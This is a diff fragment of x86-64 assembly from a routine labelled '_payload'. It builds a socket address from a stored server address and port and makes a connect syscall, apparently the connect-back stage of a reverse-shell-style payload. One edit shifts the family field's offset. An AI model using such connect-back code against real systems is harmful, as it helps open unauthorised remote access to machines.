@@ -69,11 +69,11 @@ _payload:
 	mov r13, rax
 
 	; Prepare sockaddr_in structure
-	mov word [rel CONNECT_BUFFER], 2          ; sin_family (AF_INET)
+	mov word [rel CONNECT_BUFFER + 1], 2			; sin_family (AF_INET)
 	movzx rax, word [rel SERVER_PORT]
-	mov word [rel CONNECT_BUFFER + 2], ax ; sin_port
-	mov eax, [rel SERVER_ADDR] ; Load the value from memory into EAX register
-	mov dword [rel CONNECT_BUFFER + 4], eax ; Move the value from EAX register to the destination memory location
+	mov word [rel CONNECT_BUFFER + 2], ax		; sin_port
+	mov eax, [rel SERVER_ADDR]					; Load the value from memory into EAX register
+	mov dword [rel CONNECT_BUFFER + 4], eax		; Move the value from EAX register to the destination memory location
 	
 	; Connect the socket
 	mov rax, 42						; syscall number for connect
